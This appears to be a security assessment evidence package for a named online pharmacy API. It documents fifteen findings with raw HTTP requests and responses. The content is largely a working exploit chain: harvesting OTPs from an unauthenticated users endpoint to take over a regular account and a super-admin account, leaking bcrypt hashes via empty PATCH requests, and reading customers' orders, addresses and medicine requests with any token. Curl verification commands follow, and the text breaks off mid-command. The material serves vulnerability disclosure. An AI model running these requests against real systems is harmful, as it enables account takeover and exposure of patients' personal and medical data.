# MedBasket API — Findings Evidence Package

**Classification:** Confidential — For Authorized Verification Only
**Assessment Date:** 2026-02-18
**Target:** api.medbasket.com
**Assessor:** [Assessor Name / Organization]
**Authorization Reference:** [Insert authorization document ID]

---

## Document Purpose

This evidence package contains verified findings, JWT tokens, and raw API responses
captured during the security assessment of api.medbasket.com. It is intended for
supply chain verification by authorized parties. All evidence was captured on
2026-02-18 between 05:55 UTC and 06:35 UTC.

---

## Table of Contents

1. [Infrastructure Fingerprint](#1-infrastructure-fingerprint)
2. [Finding F-01: Unauthenticated User Database Access](#finding-f-01)
3. [Finding F-02: Password Hash Exposure via PATCH](#finding-f-02)
4. [Finding F-03: Account Takeover — Regular User](#finding-f-03)
5. [Finding F-04: Account Takeover — Admin User](#finding-f-04)
6. [Finding F-05: Broken Function-Level Authorization (Orders)](#finding-f-05)
7. [Finding F-06: Admin Dashboard Without RBAC](#finding-f-06)
8. [Finding F-07: Medical Data Exposure](#finding-f-07)
9. [Finding F-08: Swagger/OpenAPI Exposure](#finding-f-08)
10. [Finding F-09: Unauthenticated Write Operations](#finding-f-09)
11. [Finding F-10: Payment Webhook Abuse](#finding-f-10)
12. [Finding F-11: S3 Bucket Misconfiguration](#finding-f-11)
13. [Finding F-12: Schema Disclosure via Validation Errors](#finding-f-12)
14. [Finding F-13: JWT Configuration Weaknesses](#finding-f-13)
15. [Finding F-14: Admin Panel False Security Perimeter](#finding-f-14)
16. [Finding F-15: Super-Admin Unauthenticated Endpoints](#finding-f-15)
17. [JWT Token Registry](#jwt-token-registry)
18. [Verification Procedures](#verification-procedures)
19. [Visual PoC Dashboard](#visual-poc-dashboard)

---

## 1. Infrastructure Fingerprint

```
Target:           api.medbasket.com
Server:           nginx/1.26.2
Framework:        FeathersJS (Node.js)
Database:         MongoDB (Mongoose ODM)
Cloud:            AWS ap-south-1
Internal IP:      172.31.XX.XX
Internal Port:    3030
S3 Bucket:        techpepo-development-s3.s3.ap-south-1.amazonaws.com
Media CDN:        media.medbasket.com (CloudFront)
Payment Gateways: PayU, Razorpay
Auth Strategies:  otp, jwt (local strategy disabled)
JWT Algorithm:    HS256
JWT Audience:     https://yourdomain.com (default)
JWT Lifetime:     30 days (2,592,000 seconds)
```

---

<a id="finding-f-01"></a>
## Finding F-01: Unauthenticated User Database Access

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **OWASP** | API1:2023 BOLA, API2:2023 Broken Authentication |
| **Endpoint** | `GET /users` |
| **Auth Required** | None |
| **Records Exposed** | 188,147 (at time of test; growing) |

### Evidence — Request

```http
GET /users?$limit=3&$select[]=_id&$select[]=email&$select[]=phoneNumber&$select[]=phoneOtp&$select[]=passwordResetToken&$select[]=dateOfBirth HTTP/2
Host: api.medbasket.com
Accept: application/json
```

### Evidence — Response (captured 2026-02-18 ~05:57 UTC)

```json
{
  "total": 188147,
  "data": [
    {
      "_id": "6000000000000000000000a1",
      "email": "admin@[REDACTED].com",
      "phoneNumber": "+91XXXXXXXXXX",
      "phoneOtp": null,
      "passwordResetToken": "[RESET_TOKEN_REDACTED]",
      "dateOfBirth": "1990-01-01T00:00:00.000Z"
    },
    {
      "_id": "6000000000000000000000a2",
      "email": "user1@[REDACTED].com",
      "phoneNumber": "+91XXXXXXXXXX",
      "phoneOtp": "XXXXX",
      "phoneOtpValidTill": "2025-10-17T08:05:22.347Z"
    },
    {
      "_id": "6000000000000000000000a3",
      "email": "user2@[REDACTED].com",
      "phoneNumber": "+91XXXXXXXXXX",
      "phoneOtp": "XXXXX",
      "phoneOtpValidTill": "2024-10-26T14:01:44.640Z"
    }
  ],
  "limit": 3,
  "skip": 0
}
```

### Exposed PII Fields (17 per record)

| # | Field | Type | Sensitivity |
|---|-------|------|-------------|
| 1 | `_id` | MongoDB ObjectId | Internal ID |
| 2 | `name` | String | PII |
| 3 | `email` | String | PII |
| 4 | `phone` | String | PII |
| 5 | `phoneNumber` | String | PII |
| 6 | `passwordResetToken` | String (60-char hex) | CRITICAL — enables account takeover |
| 7 | `passwordResetTokenExpiry` | ISO timestamp | Attack timing |
| 8 | `phoneOtp` | String (5-digit) | CRITICAL — enables OTP bypass |
| 9 | `phoneOtpValidTill` | ISO timestamp | Attack timing |
| 10 | `tempPhoneNumber` | String | PII |
| 11 | `dateOfBirth` | ISO timestamp | PII / Sensitive |
| 12 | `gender` | String | PII / Sensitive |
| 13 | `height` | String | Health data |
| 14 | `weight` | String | Health data |
| 15 | `rewardCoinsBalance` | Number | Financial |
| 16 | `hasPremiumMembership` | Boolean | Commercial |
| 17 | `accountVerified` | Boolean | Security metadata |

### Query Filtering Verified

Users are searchable by any field without authentication:
- By email: `GET /users?email=target@example.com`
- By phone: `GET /users?phoneNumber=+91XXXXXXXXXX`
- Pagination: `GET /users?$limit=100&$skip=0` (no upper limit enforced)

---

<a id="finding-f-02"></a>
## Finding F-02: Password Hash Exposure via PATCH

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **OWASP** | API3:2023 Broken Object Property Level Authorization |
| **Endpoint** | `PATCH /users/{_id}` |
| **Auth Required** | None |
| **Root Cause** | FeathersJS `protect()` after-hooks not applied to PATCH response; raw Mongoose document returned |

### Evidence — Request

```http
PATCH /users/6000000000000000000000a1 HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{}
```

### Evidence — Response (captured 2026-02-18 ~06:09 UTC)

```json
{
  "$__": {
    "activePaths": {
      "paths": {
        "hasPremiumMembership": "init",
        "rewardCoinsBalance": "init",
        "_id": "init",
        "name": "init",
        "email": "init",
        "phoneNumber": "init",
        "password": "init",
        "passwordResetToken": "init",
        "passwordResetTokenExpiry": "init",
        "phoneOtp": "init",
        "phoneOtpValidTill": "init",
        "tempPhoneNumber": "init",
        "dateOfBirth": "init",
        "gender": "init",
        "createdAt": "init",
        "updatedAt": "init",
        "accountVerified": "init"
      }
    },
    "skipId": true
  },
  "$isNew": false,
  "_doc": {
    "referral": {},
    "_id": "6000000000000000000000a1",
    "name": "[REDACTED_NAME]",
    "phone": "+91XXXXXXXXXX",
    "email": "admin@[REDACTED].com",
    "phoneNumber": "+91XXXXXXXXXX",
    "password": "$2a$10$[HASH_REDACTED]",
    "passwordResetToken": "[RESET_TOKEN_REDACTED]",
    "passwordResetTokenExpiry": "2025-01-04T10:11:04.560Z",
    "phoneOtp": null,
    "phoneOtpValidTill": null,
    "tempPhoneNumber": null,
    "dateOfBirth": "1990-01-01T00:00:00.000Z",
    "gender": "male",
    "createdAt": "2024-10-26T10:53:34.000Z",
    "updatedAt": "2026-02-18T06:09:39.959Z",
    "rewardCoinsBalance": 0,
    "hasPremiumMembership": false,
    "accountVerified": true
  }
}
```

### Confirmed on Multiple Users

| User ID | Email | Hash Prefix | Verified |
|---------|-------|-------------|----------|
| `6000000000000000000000a1` | admin@[REDACTED].com | `$2a$10$[HASH]...` | Yes |
| `6000000000000000000000a5` | testuser2@[REDACTED].com | `$2a$10$[HASH]...` | Yes |
| `6000000000000000000000a4` | testuser@[REDACTED].com | `$2a$10$[HASH]...` | Yes |

### Side Effect

PATCH modifies the `updatedAt` timestamp, confirming unauthenticated database writes:
- Before: `2024-10-26T13:34:11.000Z`
- After: `2026-02-18T06:14:49.614Z`

---

<a id="finding-f-03"></a>
## Finding F-03: Account Takeover — Regular User (Test Account)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| **OWASP** | API2:2023 Broken Authentication |
| **Target Account** | testuser@[REDACTED].com (+91XXXXXXXXXX) |
| **Time to Compromise** | < 3 seconds |

### Step 1 — Request OTP (No Auth)

```http
POST /users/request-otp HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"phoneNumber":"+91XXXXXXXXXX"}
```

**Response:**
```json
{"message":"OTP has been sent to your phone number."}
```
**HTTP Status:** 201 Created

### Step 2 — Read OTP from API (No Auth)

```http
GET /users?phoneNumber=%2B91XXXXXXXXXX&$limit=1&$select[]=phoneOtp&$select[]=phoneOtpValidTill&$select[]=email HTTP/2
Host: api.medbasket.com
```

**Response:**
```json
{
  "total": 1,
  "data": [
    {
      "phoneOtp": "XXXXX",
      "phoneOtpValidTill": "2026-02-18T06:24:43.733Z",
      "email": "testuser@[REDACTED].com"
    }
  ]
}
```

### Step 3 — Authenticate with Stolen OTP

```http
POST /authentication HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"strategy":"otp","phoneNumber":"+91XXXXXXXXXX","otp":"XXXXX"}
```

**Response:**
```json
{
  "accessToken": "<TOKEN_REDACTED>",
  "user": {
    "_id": "6000000000000000000000a4",
    "email": "testuser@[REDACTED].com",
    "password": "$2a$10$[HASH_REDACTED]",
    "tempPhoneNumber": null,
    "phoneOtp": "XXXXX",
    "phoneOtpValidTill": "2026-02-18T06:24:43.733Z",
    "cart": {"items": []},
    "name": "test ",
    "phoneNumber": "+91XXXXXXXXXX",
    "createdAt": "2024-10-26T13:34:11.000Z",
    "updatedAt": "2026-02-18T06:15:50.074Z",
    "rewardCoinsBalance": 0,
    "hasPremiumMembership": false,
    "accountVerified": true
  },
  "authentication": {
    "payload": {
      "iat": 1771395787,
      "exp": 1773987787,
      "aud": "https://yourdomain.com",
      "sub": "6000000000000000000000a4",
      "jti": "[JTI_REDACTED]"
    }
  }
}
```

### JWT Token — Regular User (F-03)

```
<TOKEN_REDACTED>
```

**Decoded Payload:**
```json
{
  "iat": 1771395787,
  "exp": 1773987787,
  "aud": "https://yourdomain.com",
  "sub": "6000000000000000000000a4",
  "jti": "[JTI_REDACTED]"
}
```

| Field | Value |
|-------|-------|
| Subject (user ID) | `6000000000000000000000a4` |
| Issued At | 2026-02-18 06:16:27 UTC |
| Expires | 2026-03-20 06:16:27 UTC |
| Audience | `https://yourdomain.com` (default) |
| JTI | `[JTI_REDACTED]` |

**Note:** The authentication response also leaks the user's bcrypt password hash.

---

<a id="finding-f-04"></a>
## Finding F-04: Account Takeover — Admin User

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| **OWASP** | API2:2023 Broken Authentication |
| **Target Account** | admin@[REDACTED].com (+91XXXXXXXXXX) |
| **Admin Status** | Confirmed super-admin (forgot-password accepted, /request-super-admin-otp accepted) |

### Step 1 — Identify Admin User (No Auth)

```http
GET /users?email=admin@[REDACTED].com&$limit=1&$select[]=phoneNumber&$select[]=_id HTTP/2
Host: api.medbasket.com
```

**Response:** Phone `+91XXXXXXXXXX`, ID `6000000000000000000000a1`

### Step 2 — Request Consumer OTP for Admin Phone (No Auth)

```http
POST /users/request-otp HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"phoneNumber":"+91XXXXXXXXXX"}
```

**Response:** `201 Created` — `{"message":"OTP has been sent to your phone number."}`

### Step 3 — Read Admin OTP (No Auth)

```http
GET /users?phoneNumber=%2B91XXXXXXXXXX&$limit=1&$select[]=phoneOtp&$select[]=phoneOtpValidTill&$select[]=email HTTP/2
Host: api.medbasket.com
```

**Response (captured 2026-02-18 06:30 UTC):**
```json
{
  "total": 2,
  "data": [
    {
      "email": "admin@[REDACTED].com",
      "phoneOtp": "XXXXX",
      "phoneOtpValidTill": "2026-02-18T06:32:28.587Z",
      "_id": "6000000000000000000000a1"
    }
  ]
}
```

### Step 4 — Authenticate as Admin (No Auth)

```http
POST /authentication HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"strategy":"otp","phoneNumber":"+91XXXXXXXXXX","otp":"XXXXX"}
```

**Response:**
```json
{
  "accessToken": "<TOKEN_REDACTED>",
  "user": {
    "_id": "6000000000000000000000a1",
    "name": "[REDACTED_NAME]",
    "phone": "+91XXXXXXXXXX",
    "email": "admin@[REDACTED].com",
    "phoneNumber": "+91XXXXXXXXXX",
    "password": "$2a$10$[HASH_REDACTED]",
    "passwordResetToken": "[RESET_TOKEN_REDACTED]",
    "passwordResetTokenExpiry": "2025-01-04T10:11:04.560Z",
    "phoneOtp": "XXXXX",
    "phoneOtpValidTill": "2026-02-18T06:32:28.587Z",
    "tempPhoneNumber": null,
    "dateOfBirth": "1990-01-01T00:00:00.000Z",
    "gender": "male",
    "createdAt": "2024-10-26T10:53:34.000Z",
    "updatedAt": "2026-02-18T06:22:30.853Z",
    "rewardCoinsBalance": 0,
    "hasPremiumMembership": false,
    "accountVerified": true
  },
  "authentication": {
    "payload": {
      "iat": 1771396228,
      "exp": 1773988228,
      "aud": "https://yourdomain.com",
      "sub": "6000000000000000000000a1",
      "jti": "[JTI_REDACTED]"
    }
  }
}
```

### JWT Token — Admin User (F-04)

```
<TOKEN_REDACTED>
```

**Decoded Payload:**
```json
{
  "iat": 1771396228,
  "exp": 1773988228,
  "aud": "https://yourdomain.com",
  "sub": "6000000000000000000000a1",
  "jti": "[JTI_REDACTED]"
}
```

| Field | Value |
|-------|-------|
| Subject (user ID) | `6000000000000000000000a1` |
| Issued At | 2026-02-18 06:23:48 UTC |
| Expires | 2026-03-20 06:23:48 UTC |
| Audience | `https://yourdomain.com` (default) |
| JTI | `[JTI_REDACTED]` |

### Admin Confirmation Evidence

The super-admin status of `admin@[REDACTED].com` is confirmed by:

1. `POST /super-admin-users/forgot-password {"email":"admin@[REDACTED].com"}` → `201 Created`, `"Sent reset password mail"`
2. `POST /request-super-admin-otp {"phoneNumber":"+91XXXXXXXXXX"}` → `201 Created`
3. Both endpoints validate the user exists in the admin collection before responding.

---

<a id="finding-f-05"></a>
## Finding F-05: Broken Function-Level Authorization (Orders)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **OWASP** | API5:2023 Broken Function Level Authorization |
| **Endpoint** | `GET /super-admin-users/orders` |
| **Auth Required** | Any valid JWT (no role check) |
| **Records Exposed** | 62,900+ orders (growing) |

### Evidence — Request (using regular user JWT from F-03)

```http
GET /super-admin-users/orders?$limit=1 HTTP/2
Host: api.medbasket.com
Authorization: Bearer <TOKEN_REDACTED>
```

### Evidence — Response (truncated, captured 2026-02-18 ~06:24 UTC)

```json
{
  "total": 62880,
  "data": [
    {
      "_id": "6000000000000000000000a8",
      "status": "paid",
      "orderTotal": 729,
      "subTotal": 899,
      "currency": "INR",
      "couponCode": "REPEAT175",
      "discountedAmount": 175,
      "paymentAmount": 729,
      "taxAmount": 127.5,
      "paymentMode": "payu",
      "orderId": "0XXXXXXXX",
      "createdAt": "2026-02-18T06:29:04.450Z",
      "items": [
        {"productId": "6000000000000000000000b2", "quantity": 1, "amount": 264, "total": 264},
        {"productId": "6000000000000000000000b3", "quantity": 2, "amount": 150, "total": 300},
        {"productId": "6000000000000000000000b4", "quantity": 2, "amount": 150, "total": 300},
        {"productId": "6000000000000000000000b5", "quantity": 1, "amount": 35, "total": 35}
      ],
      "address": {
        "userName": "[REDACTED_NAME]",
        "phoneNumber": "XXXXXXXXXX",
        "addressLine1": "[REDACTED_AREA]",
        "addressLine2": "[REDACTED_LANDMARK]",
        "postalCode": "XXXXXX",
        "city": "[REDACTED_DISTRICT]",
        "state": "WEST BENGAL",
        "coordinates": {
          "longitude": XX.XXXXXX,
          "latitude": XX.XXXXXX
        },
        "fullAddress": "[REDACTED_ROAD], [REDACTED_ROAD], [REDACTED_AREA], West Bengal, India",
        "alternatePhoneNumber": "XXXXXXXXXX",
        "country": "india"
      },
      "patientId": "6000000000000000000000b0",
      "deviceType": "ios",
      "paymentOrderId": "TXN[REDACTED]"
    }
  ]
}
```

### RBAC Verification

Both tokens were tested against this endpoint with identical results:

| Token | User | Role | Response | Records |
|-------|------|------|----------|---------|
| F-03 JWT (regular) | testuser@[REDACTED].com | Regular user | 200 OK | 62,880 |
| F-04 JWT (admin) | admin@[REDACTED].com | Super admin | 200 OK | 62,880 |

**Conclusion:** No role-based access control is enforced. Any authenticated user gets full admin order access.

### PII Exposed Per Order Record

- Customer name, phone, alternate phone
- Full delivery address (street, city, state, postal code)
- GPS coordinates (latitude, longitude)
- Order items, amounts, payment mode
- Coupon codes used
- Patient ID (medical link)
- Device type

---

<a id="finding-f-06"></a>
## Finding F-06: Admin Dashboard Without RBAC

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.8 |
| **Endpoint** | `GET /dashboard` |
| **Auth Required** | Any valid JWT (no role check) |

### Evidence — Response (using regular user JWT, captured 2026-02-18 ~06:24 UTC)

```json
{
  "revenueStat": {
    "currentMonth": 1863460.81392,
    "lastMonth": 3974896.4902,
    "difference": "-53.12%"
  },
  "ordersStat": {
    "currentMonth": 3335,
    "lastMonth": 5408,
    "difference": "-38.33%"
  },
  "customersStat": {
    "currentMonth": 16140,
    "lastMonth": 26128,
    "difference": "-38.23%"
  },
  "weeklySales": [
    {"startDate": "26 Jan 26", "endDate": "01 Feb 26", "revenue": 685893.531},
    {"startDate": "02 Feb 26", "endDate": "08 Feb 26", "revenue": 749149.3606},
    {"startDate": "09 Feb 26", "endDate": "15 Feb 26", "revenue": 745918.76664},
    {"startDate": "16 Feb 26", "endDate": "22 Feb 26", "revenue": 227321.19868}
  ],
  "recentOrders": [
    {
      "orderId": "0XXXXXXXX",
      "createdAt": "2026-02-18",
      "orderTotal": 494.5,
      "status": "paid",
      "customer": {
        "id": "6000000000000000000000b1",
        "name": "[REDACTED_NAME] ",
        "email": "customer1@[REDACTED].com"
      }
    },
    {
      "orderId": "0XXXXXXXX",
      "orderTotal": 409,
      "status": "paid",
      "customer": {
        "name": "[REDACTED_NAME]",
        "email": "customer2@[REDACTED].com"
      }
    },
    {
      "orderId": "p0XXXXXXXX",
      "orderTotal": 204,
      "status": "pending",
      "customer": {
        "name": "[REDACTED_NAME]",
        "email": "customer3@[REDACTED].com"
      }
    }
  ],
  "topSellingProducts": [
    {"name": "Pantoprazole IP 40 mg & Domperidone 30 mg (SR) Capsule", "sales": 582},
    {"name": "Telmisartan IP 40mg Tablet", "sales": 529},
    {"name": "Cholecalciferol (Vitamin D3) 60,000 IU Sachet", "sales": 360}
  ]
}
```

---

<a id="finding-f-07"></a>
## Finding F-07: Medical Data Exposure

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 7.5 |
| **OWASP** | API1:2023 BOLA |
| **Endpoint** | `GET /medicine-requests` |
| **Auth Required** | Any valid JWT |
| **Records Exposed** | 6,655 |

### Evidence — Response (captured 2026-02-18 ~06:25 UTC)

```json
{
  "total": 6654,
  "data": [
    {
      "_id": "6000000000000000000000a9",
      "medicineName": "[REDACTED]",
      "files": [
        "https://media.medbasket.com/medbasket/[FILE_ID_REDACTED]-example.jpg"
      ],
      "requestNo": "10250",
      "requestedDate": "2025-10-31T18:11:46.984Z",
      "requestedUserId": "6000000000000000000000a7",
      "status": "open",
      "notes": "this is test"
    }
  ]
}
```

### Additional Medical-Adjacent Endpoints

| Endpoint | Records | Auth | Status |
|----------|---------|------|--------|
| `/medicine-remainder` | 708 | Any JWT | 200 OK |
| `/patients` | user-scoped | Any JWT | 200 OK |
| `/consultations` | user-scoped | Any JWT | 200 OK |

---

<a id="finding-f-08"></a>
## Finding F-08: Swagger/OpenAPI Exposure

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 7.5 |
| **Endpoint** | `GET /swagger.json`, `GET /docs` |
| **Auth Required** | None |
| **Endpoints Documented** | 300+ |

### Evidence — Key extracts

```
Internal server: http://ip-172-31-XX-XX.ap-south-1.compute.internal:3030
Security schemes: BearerAuth (http/bearer)
Schemas: Carts, ConsumerProducts
Total paths: 300+
```

### Sensitive Endpoints Documented in Public Spec

- `/super-admin-users` (CRUD + orders, invitations, password reset)
- `/store-admin-users` (CRUD + orders, password reset)
- `/payment` (CRUD + PayU/Razorpay webhooks)
- `/users` (CRUD + registration, OTP, password reset)
- `/roles`, `/permissions`, `/modules`
- `/logistics`, `/delivery-policies`
- `/bulk-upload`, `/exports`, `/reports`

---

<a id="finding-f-09"></a>
## Finding F-09: Unauthenticated Write Operations

| Endpoint | Method | Response | Impact |
|----------|--------|----------|--------|
| `PATCH /users/{id}` | PATCH | 200 OK | Modifies user records, leaks password hashes |
| `POST /admin-zip-codes` | POST | **201 Created** | Injects admin delivery zone data |
| `POST /users/reset-password` | POST | **201 Created** (`{"_id":"6000000000000000000000a6"}`) | Creates password reset records |
| `POST /users/request-otp` | POST | **201 Created** | Generates and sends OTPs |
| `POST /request-super-admin-otp` | POST | **201 Created** | Generates super-admin OTPs |
| `POST /contact-us` | POST | 400 (needs `phoneNumber`) | Accepts unauthenticated submissions |
| `POST /users/register` | POST | 400 (needs `name`) | Open user registration |
| `POST /app-data` | POST | 400 (validation) | Accepts writes with valid data |

---

<a id="finding-f-10"></a>
## Finding F-10: Payment Webhook Abuse

| Endpoint | Method | Response Code | Response Body |
|----------|--------|---------------|---------------|
| `POST /webhooks` | POST | **200 OK** | `{"price":"333.20"}` |
| `POST /webhooks/delivery-tracking` | POST | **200 OK** | `{}` |
| `POST /payment/webhook/payu` | POST | 500 | `{"message":"Payu webhook error: Invalid Merchant key received in response"}` |
| `POST /payment/webhook/razorpay` | POST | 500 | `{"message":"Invalid webhook signature"}` |
| `POST /webhooks/chatbot` | POST | 500 | `{"message":"Cannot destructure property 'controller' of 'session' as it is undefined."}` |

**Information disclosed:** PayU and Razorpay integration confirmed, internal code structure leaked in error messages.

---

<a id="finding-f-11"></a>
## Finding F-11: S3 Bucket Misconfiguration

| Test | Result |
|------|--------|
| Bucket listing (`GET /`) | 403 AccessDenied |
| Direct object access | **200 OK** (publicly readable) |
| Bucket name | `techpepo-development-s3` (development bucket in production) |
| `/attachments` endpoint | 98,390 file URLs enumerable without auth |
| AWS Access Key ID in URLs | `AKIA[REDACTED]` |

### Evidence — S3 Object Direct Access

```http
HEAD /6LxdkEbKhemH38c5s7dOs-bags.png HTTP/1.1
Host: techpepo-development-s3.s3.ap-south-1.amazonaws.com

HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 48100
x-amz-server-side-encryption: AES256
```

---

<a id="finding-f-12"></a>
## Finding F-12: Schema Disclosure via Validation Errors

Sending an invalid `$select` field returns the complete list of allowed fields:

```json
{
  "name": "BadRequest",
  "message": "validation failed",
  "data": [
    {
      "params": {
        "allowedValues": [
          "_id", "email", "phoneNumber", "password", "googleId",
          "accountVerified", "tempPhoneNumber", "phoneOtp",
          "phoneOtpValidTill", "passwordResetToken",
          "passwordResetTokenExpiry", "dateOfBirth", "gender",
          "height", "weight", "createdAt", "updatedAt",
          "hasPremiumMembership", "rewardCoinsBalance",
          "premiumMembership", "profileToken",
          "profileTokenValidTill", "identifierType", "isWeb",
          "referralCode", "referral"
        ]
      }
    }
  ]
}
```

**27 fields disclosed**, including undocumented: `googleId`, `profileToken`, `profileTokenValidTill`, `identifierType`, `isWeb`, `referralCode`.

---

<a id="finding-f-13"></a>
## Finding F-13: JWT Configuration Weaknesses

| Issue | Evidence |
|-------|----------|
| Default audience | `"aud": "https://yourdomain.com"` — FeathersJS default never changed |
| 30-day token lifetime | `exp - iat = 2,592,000 seconds` |
| No refresh token mechanism | Only access tokens issued |
| Password hash in auth response | Bcrypt hash returned in `user.password` on successful auth |
| HS256 algorithm | Symmetric key — single secret compromise = all tokens forgeable |
| No token revocation | No blacklist mechanism observed |

---

<a id="finding-f-14"></a>
## Finding F-14: Admin Panel False Security Perimeter

| Field | Value |
|-------|-------|
| **Severity** | INFORMATIONAL (frontend only) / CRITICAL (API layer) |
| **Target** | `admin.medbasket.com` |
| **Framework** | Next.js with Auth.js v5 |
| **Impact** | Frontend auth creates false sense of security; API data fully exposed |

### Admin Panel Architecture

```
admin.medbasket.com (Next.js)
  ├── Auth.js v5 (credentials provider)
  │   ├── Cookie: __Host-authjs.csrf-token
  │   ├── Cookie: __Secure-authjs.callback-url
  │   └── Server Action: handleCredentialSignIn
  ├── Login form: email + password
  ├── Forgot password: /super-admin/forgot-password
  └── Authenticates against: super-admin-users collection (SEPARATE from users)

api.medbasket.com (FeathersJS)
  ├── /users collection → OTP chain works, JWT issued
  ├── /super-admin-users collection → Requires admin auth (properly protected)
  ├── /super-admin-users/orders → ANY JWT accepted (NO RBAC) ← CRITICAL
  ├── /dashboard → ANY JWT accepted (NO RBAC) ← CRITICAL
  └── /medicine-requests → ANY JWT accepted (NO RBAC) ← CRITICAL
```

### Evidence — Auth.js Cookies

```http
GET /login HTTP/2
Host: admin.medbasket.com

Set-Cookie: __Host-authjs.csrf-token=[CSRF_REDACTED]...%7C[CSRF_REDACTED]...; Path=/; HttpOnly; Secure; SameSite=Lax
Set-Cookie: __Secure-authjs.callback-url=https%3A%2F%2Fadmin.medbasket.com; Path=/; HttpOnly; Secure; SameSite=Lax
```

### Evidence — Separate super-admin-users Collection

```http
GET /super-admin-users HTTP/2
Host: api.medbasket.com
Authorization: Bearer <regular_user_jwt>

→ 404 "No record found for id '6000000000000000000000a1'"
```

The JWT's `sub` claim (from users collection) is not found in super-admin-users collection, confirming separate data stores.

### Evidence — local Strategy Disabled

```http
POST /authentication HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"strategy":"local","email":"admin@[REDACTED].com","password":"test"}

→ 401 "Invalid authentication information (strategy not allowed in authStrategies)"
```

Only `otp` and `jwt` strategies are enabled. The admin panel likely uses a custom auth flow via the super-admin-users service.

### Key Conclusion

The admin panel frontend has proper authentication (Auth.js v5 with separate super-admin collection). However, this is a **false security perimeter** because:
1. All admin API data (`/super-admin-users/orders`, `/dashboard`, `/medicine-requests`) is accessible with ANY authenticated user JWT
2. The frontend protects the UI, not the data
3. An attacker bypasses the admin panel entirely by calling the API directly

---

<a id="finding-f-15"></a>
## Finding F-15: Super-Admin Unauthenticated Endpoints

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| **OWASP** | API2:2023 Broken Authentication |

### Evidence — Forgot Password (No Auth)

```http
POST /super-admin-users/forgot-password HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"email":"admin@[REDACTED].com"}
```

**Response:**
```json
{"message":"Sent reset password mail"}
```

This confirms the email exists in the super-admin-users collection without requiring authentication. Enables admin account enumeration.

### Evidence — Reset Password (No Auth, Validation Only)

```http
POST /super-admin-users/reset-password HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"email":"admin@[REDACTED].com","token":"test","password":"test"}
```

**Response:**
```json
{
  "name": "BadRequest",
  "message": "validation failed",
  "data": [{"params":{"missingProperty":"newPassword"},"message":"must have required property 'newPassword'"}]
}
```

The endpoint:
1. Does not require authentication
2. Validates the request schema (disclosing field names: `email`, `token`, `newPassword`)
3. Would process the reset if a valid token were supplied

### Evidence — Request Super-Admin OTP (No Auth)

```http
POST /request-super-admin-otp HTTP/2
Host: api.medbasket.com
Content-Type: application/json

{"email":"admin@[REDACTED].com"}
```

**Response:**
```json
{
  "name": "BadRequest",
  "data": [{"params":{"missingProperty":"phoneNumber"},"message":"must have required property 'phoneNumber'"}]
}
```

Requires `phoneNumber` instead of `email`. When called with a phone number, returns `{}` (empty response, no error — may trigger OTP send).

### Super-Admin Endpoint Access Matrix

| Endpoint | Auth Required | Response |
|----------|--------------|----------|
| `GET /super-admin-users` | Yes | 401 |
| `POST /super-admin-users` | Yes | 401 |
| `POST /super-admin-users/forgot-password` | **No** | 200 "Sent reset password mail" |
| `POST /super-admin-users/reset-password` | **No** | 400 (validation) |
| `POST /super-admin-users/login` | Yes* | 401 |
| `POST /request-super-admin-otp` | **No** | 400 → requires phoneNumber |
| `GET /super-admin-users/orders` | Any JWT | 200 (62,900+ orders) |
| `GET /super-admin-users/forgot-password` | **No** | 200 `[]` |

---

<a id="jwt-token-registry"></a>
## JWT Token Registry

All tokens issued during this assessment for verification purposes:

### Token 1: Regular User (testuser@[REDACTED].com)

```
<TOKEN_REDACTED>
```

| Field | Value |
|-------|-------|
| User | testuser@[REDACTED].com |
| User ID | `6000000000000000000000a4` |
| Issued | 2026-02-18 06:16:27 UTC |
| Expires | 2026-03-20 06:16:27 UTC |
| JTI | `[JTI_REDACTED]` |
| OTP Used | `XXXXX` (captured from `/users` endpoint) |
| Acquisition | OTP chain (F-03) |

### Token 2: Admin User (admin@[REDACTED].com)

```
<TOKEN_REDACTED>
```

| Field | Value |
|-------|-------|
| User | admin@[REDACTED].com |
| User ID | `6000000000000000000000a1` |
| Issued | 2026-02-18 06:23:48 UTC |
| Expires | 2026-03-20 06:23:48 UTC |
| JTI | `[JTI_REDACTED]` |
| OTP Used | `XXXXX` (captured from `/users` endpoint) |
| Acquisition | OTP chain (F-04) |
| Admin Confirmed | Yes (super-admin forgot-password + request-super-admin-otp both accepted) |

### Bcrypt Password Hashes Captured

| User | Email | Hash |
|------|-------|------|
| `6000000000000000000000a1` | admin@[REDACTED].com | `$2a$10$[HASH_REDACTED]` |
| `6000000000000000000000a5` | testuser2@[REDACTED].com | `$2a$10$[HASH_REDACTED]` |
| `6000000000000000000000a4` | testuser@[REDACTED].com | `$2a$10$[HASH_REDACTED]` |

**Source:** PATCH response `_doc.password` field and authentication response `user.password` field.

---

<a id="verification-procedures"></a>
## Verification Procedures

Supply chain verifiers can use these commands to independently validate each finding:

### Verify F-01 (User Database)
```bash
curl -s "https://api.medbasket.com/users?\$limit=1" | python3 -c "
